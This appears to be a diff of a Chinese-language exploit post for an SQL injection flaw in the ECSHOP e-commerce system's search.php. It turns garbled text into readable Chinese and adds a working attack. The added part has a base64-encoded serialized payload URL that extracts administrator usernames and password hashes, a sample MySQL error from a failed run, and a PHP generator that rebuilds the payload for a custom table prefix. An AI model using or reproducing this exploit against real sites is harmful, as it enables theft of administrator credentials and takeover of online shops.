@@ -1,7 +1,7 @@
-ECSHOP�̳�ϵͳSearch.phpҳ����˲��ϵ���SQLע��©��
+ECSHOP商城系统Search.php页面过滤不严导致SQL注入漏洞
 
 
-©������:
+漏洞利用:
 
  
 <?php   
@@ -149,8 +149,28 @@ crkpassword($hostname, $path, 2,$goodid);
 ?>   
  
 
-�������Ǹ������ֵ�0day ����ֱ�ӵõ�����Ա���û���������
+这里我们给出变种的0day 可以直接得到管理员的用户名和密码
 
 search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319
 
+
+返回：
+MySQL server error report:Array ( [0] => Array ( [message] => MySQL Query Error ) [1] => Array ( [sql] => SELECT goods_id, COUNT(*) AS num FROM `ccwww`.`ccc_goods_attr` WHERE 0 OR (1 AND attr_id = '1') and 1=2 GROUP BY goods_id union all select concat(user_name,0x3a,password,'"\') union select 1#"'),1 from ecs_admin_user#' AND attr_value LIKE '%1%' ) GROUP BY goods_id HAVING num = '1' ) [2] => Array ( [error] => Table 'ccwww.ecs_admin_user' doesn't exist ) [3] => Array ( [errno] => 1146 ) )
+原因是数据库前缀修改的问题。
+
+解决办法：重新生成EXP变种文件。
+
+用下面的代码生成一个code：
+
+ 
+
+<?php
+$p="ecs_";
+$p=isset($_REQUEST['pre'])?$_REQUEST['pre']:$p;
+$arr=array("1') and 1=2 GROUP BY goods_id union all select concat(user_name,0x3a,password,'\"\\') union select 1#\"'),1 from ".$p."admin_user#"=>"1");
+$exp = array("attr"=>$arr);
+$exp = base64_encode(serialize($exp));
+//echo $exp;
+?>
+<textarea name="textarea" id="textarea" cols="100" rows="5"><?=$exp?></textarea>
 
